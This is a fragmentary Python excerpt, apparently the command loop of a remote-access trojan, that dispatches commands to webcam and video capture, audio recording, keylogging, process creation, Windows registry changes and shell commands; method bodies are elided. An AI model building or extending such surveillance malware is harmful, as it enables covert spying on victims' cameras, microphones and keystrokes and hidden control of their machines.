            ...
            try:
                ...
                if todo != "":
                    ...
                    if command == 'upload':
                        ...
                        self.camshot()
                    elif command == 'cam_video':
                        self.cameravideo()
                    elif command == 'show_proc':
                        print("in")
                        self.show_proc()
                    elif command == 'create_proc':
                        self.create_proc("calc")
                    elif command =='audiocatch':
                        self.audiocatch()
                    elif command == 'keylogger':
                        self.getloggedkeys()
                    elif command == 'add_reg':
                        self.add_reg()
                    elif command == 'ie_reg_modify':
                        self.ie_reg_modify()
                    elif command == 'delete_reg':
                        self.delete_reg()
                    elif command == 'disp_reg':
                        self.disp_reg()
                    elif command == 'cd':
                        self.runcmd("dir ..")
                    else:
